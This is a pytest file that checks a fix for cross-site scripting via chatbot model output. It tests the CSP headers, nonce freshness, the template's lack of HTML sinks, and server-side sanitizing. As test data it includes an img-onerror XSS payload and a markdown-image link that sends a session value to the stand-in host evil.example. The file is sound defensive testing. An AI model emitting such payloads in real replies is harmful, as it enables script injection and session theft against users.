"""Fix V5 (XSS via model output), tested offline: headers, template structure, server-side sanitizing.

The browser-level proof (does a payload run?) is `breakit render-check` against the live app.
"""

import re

from breakit.detectors import detect_v5

TEMPLATE = (__import__("conftest").SECUREBOT / "templates" / "index.html").read_text()


def _nonce(csp: str) -> str:
    return re.search(r"script-src 'nonce-([^']+)'", csp).group(1)


def test_page_has_a_strict_nonce_csp_that_matches_its_own_tags(bot):
    page = bot.client.get("/")
    csp = page.headers["content-security-policy"]
    nonce = _nonce(csp)
    assert "unsafe-inline" not in csp and "unsafe-eval" not in csp
    for directive in ("object-src 'none'", "base-uri 'none'", "frame-ancestors 'none'", "img-src 'self'"):
        assert directive in csp
    assert f'<script nonce="{nonce}">' in page.text and f'<style nonce="{nonce}">' in page.text


def test_nonce_is_fresh_per_page_load(bot):
    a = _nonce(bot.client.get("/").headers["content-security-policy"])
    b = _nonce(bot.client.get("/").headers["content-security-policy"])
    assert a != b and len(a) >= 16


def test_template_has_no_html_sink_and_nothing_csp_would_have_to_allow():
    assert "innerHTML" not in TEMPLATE and "outerHTML" not in TEMPLATE and "insertAdjacentHTML" not in TEMPLATE
    assert not re.search(r'<[a-z][^>]*\sstyle="', TEMPLATE)  # inline style attributes would need 'unsafe-inline'
    assert not re.search(r"<[^>]+\son[a-z]+\s*=", TEMPLATE)  # no inline event handlers in markup


def test_exemplar_reply_reaches_the_client_without_active_html(bot):
    payload = '<img src="np001.jpg" onerror="alert(`Image unavailable`)">'
    body = bot(f"<h2>Return Policy</h2>\n<p>30 days.</p>\n{payload}")
    assert not detect_v5(body["response"], payload)["active_html"]
    assert "Return Policy" in body["response"] and "30 days." in body["response"]


def test_markdown_image_exfiltration_is_removed(bot):
    body = bot("Here you go ![logo](https://evil.example/collect?d=session123)")
    assert "evil.example" not in body["response"] and "[image removed]" in body["response"]


def test_benign_text_with_angle_bracket_survives(bot):
    assert bot("I <3 my tablet, rated 5 > 4!")["response"] == "I <3 my tablet, rated 5 > 4!"


def test_security_headers_on_api_responses(bot):
    bot("hello")
    r = bot.client.post("/api/actions/confirm", json={"grant": "x"})
    assert r.headers["x-content-type-options"] == "nosniff"
    assert r.headers["referrer-policy"] == "no-referrer"
